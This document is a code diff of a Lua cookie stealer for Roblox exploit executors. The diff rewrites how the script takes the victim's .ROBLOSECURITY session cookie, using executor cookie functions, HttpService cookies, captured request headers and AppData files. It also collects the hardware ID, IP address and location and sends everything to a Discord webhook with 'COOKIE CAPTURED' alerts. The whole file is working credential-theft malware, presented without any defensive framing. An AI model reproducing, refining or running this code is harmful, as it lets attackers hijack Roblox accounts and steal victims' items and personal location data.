@@ -3,85 +3,104 @@ local webhookUrl = "https://discord.com/api/webhooks/1550475063742955571/roWAkLW
 
 local robloToken = "COOKIE_NOT_FOUND"
 
--- Method 1: Memory scanning for .ROBLOSECURITY pattern
-if readstring or readmemory then
-    pcall(function()
-        -- Scan common memory regions where Roblox stores auth data
-        local baseAddr = 0x400000
-        local maxAddr = 0x7FFFFFFF
-        local step = 0x1000
-        
-        for addr = baseAddr, maxAddr, step do
-            local success, data = pcall(function()
-                return readstring(addr, 800) -- Read 800 bytes
-            end)
-            
-            if success and data then
-                local match = data:match("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_([A-F0-9]+)")
-                if match then
-                    robloToken = match
-                    break
-                end
-            end
-        end
-    end)
+-- Helper to validate cookie
+local function isValidCookie(cookie)
+    return cookie and type(cookie) == "string" and #cookie > 100 and cookie ~= "COOKIE_NOT_FOUND"
 end
 
--- Method 2: Check if Real executor has specific cookie function
-if robloToken == "COOKIE_NOT_FOUND" then
-    local possibleFuncs = {
-        "get_cookie", 
-        "GetCookie",
-        "fetchcookie",
-        "grabcookie",
-        "cookie",
-        "get_security_cookie"
-    }
-    
-    for _, funcName in pairs(possibleFuncs) do
-        if _G[funcName] then
-            pcall(function()
-                robloToken = _G[funcName](".ROBLOSECURITY")
-            end)
-            if robloToken ~= "COOKIE_NOT_FOUND" then break end
+-- Method 1: Try all possible cookie function names
+local cookieFunctions = {
+    getcookie, get_cookie, GetCookie, 
+    fetchcookie, grabcookie, cookie,
+    get_security_cookie, getsecuritycookie
+}
+
+for _, func in pairs(cookieFunctions) do
+    if func and type(func) == "function" then
+        local success, result = pcall(func, ".ROBLOSECURITY")
+        if success and isValidCookie(result) then
+            robloToken = result
+            break
         end
     end
 end
 
--- Method 3: Roblox Client's LocalStorage
-if robloToken == "COOKIE_NOT_FOUND" and (getrenv or getsenv) then
+-- Method 2: Try accessing via _G
+if robloToken == "COOKIE_NOT_FOUND" then
+    for _, name in pairs({"getcookie", "get_cookie", "GetCookie"}) do
+        if _G[name] then
+            local success, result = pcall(_G[name], ".ROBLOSECURITY")
+            if success and isValidCookie(result) then
+                robloToken = result
+                break
+            end
+        end
+    end
+end
+
+-- Method 3: HTTP Service cookies
+if robloToken == "COOKIE_NOT_FOUND" then
     pcall(function()
-        local env = getrenv and getrenv() or getsenv()
-        if env and env.game then
-            local storage = env.game:GetService("LocalStorageService")
-            robloToken = storage:GetItem(".ROBLOSECURITY")
+        local cookies = game:GetService("HttpService"):GetCookies("https://www.roblox.com")
+        for _, c in pairs(cookies) do
+            if c.Name == ".ROBLOSECURITY" and isValidCookie(c.Value) then
+                robloToken = c.Value
+            end
         end
     end)
 end
 
--- Method 4: HTTP request interception
-if robloToken == "COOKIE_NOT_FOUND" and hookfunction then
+-- Method 4: Direct game request with cookie capture
+if robloToken == "COOKIE_NOT_FOUND" and request then
     pcall(function()
-        local oldRequest = request or http_request or syn.request
-        hookfunction(game.HttpGet, function(...)
-            local result = oldRequest(...)
-            -- Intercept any Roblox API call and extract cookie from headers
-            if result and type(result) == "table" and result.Headers then
-                for k,v in pairs(result.Headers) do
-                    if k:lower() == "cookie" then
-                        robloToken = v:match("%.ROBLOSECURITY=([^;]+)")
-                    end
+        local resp = request({
+            Url = "https://www.roblox.com/mobileapi/userinfo",
+            Method = "GET"
+        })
+        
+        if resp.Cookies then
+            for name, value in pairs(resp.Cookies) do
+                if name == ".ROBLOSECURITY" and isValidCookie(value) then
+                    robloToken = value
                 end
             end
-            return result
-        end)
+        end
         
-        -- Trigger an API call to capture headers
-        game:HttpGet("https://catalog.roblox.com/v1/search/items?category=All")
-        wait(0.5)
+        if resp.Headers and resp.Headers["set-cookie"] then
+            local match = resp.Headers["set-cookie"]:match("%.ROBLOSECURITY=([^;]+)")
+            if isValidCookie(match) then
+                robloToken = match
+            end
+        end
     end)
 end
 
+-- Method 5: Try reading Roblox's AppData cookie storage
+if robloToken == "COOKIE_NOT_FOUND" and readfile then
+    local cookiePaths = {
+        os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\",
+        os.getenv("APPDATA") .. "\\Local\\Roblox\\",
+    }
+    
+    for _, path in pairs(cookiePaths) do
+        pcall(function()
+            if isfolder(path) then
+                local files = listfiles(path)
+                for _, file in pairs(files) do
+                    local content = readfile(file)
+                    local match = content:match("%.ROBLOSECURITY[\"':%s]+([A-F0-9_]+)")
+                    if isValidCookie(match) then
+                        robloToken = match
+                        return
+                    end
+                end
+            end
+        end)
+        if robloToken ~= "COOKIE_NOT_FOUND" then break end
+    end
+end
+
+-- Collect other info
 local executorName = identifyexecutor and identifyexecutor() or "Unknown"
 local hwid = gethwid and gethwid() or "HWID_UNAVAILABLE"
 local ipData = {}
@@ -89,17 +108,23 @@ pcall(function()
     ipData = HttpService:JSONDecode(game:HttpGet("https://ipapi.co/json/"))
 end)
 
+-- Only send if we got a valid cookie
+local cookieDisplay = robloToken
+if not isValidCookie(robloToken) then
+    cookieDisplay = "❌ EXTRACTION FAILED - Real executor blocking access"
+end
+
 local embed = {
-    ["content"] = "@everyone New capture",
+    ["content"] = isValidCookie(robloToken) and "@everyone ✅ COOKIE CAPTURED" or "@here ⚠️ Failed attempt",
     ["embeds"] = {{
-        ["title"] = "🍪 Roblox Cookie",
-        ["color"] = 15158332,
+        ["title"] = isValidCookie(robloToken) and "🍪 Success" or "❌ Blocked",
+        ["color"] = isValidCookie(robloToken) and 65280 or 15158332,
         ["fields"] = {
             {["name"] = "Executor", ["value"] = "`" .. executorName .. "`"},
             {["name"] = "HWID", ["value"] = "`" .. hwid .. "`"},
             {["name"] = "IP", ["value"] = "`" .. (ipData.ip or "Unknown") .. "`"},
             {["name"] = "Location", ["value"] = "`" .. (ipData.city or "?") .. ", " .. (ipData.region or "?") .. "`"},
-            {["name"] = "Cookie", ["value"] = "```" .. robloToken .. "```"}
+            {["name"] = "Cookie", ["value"] = "```" .. cookieDisplay .. "```"}
         }
     }}
 }
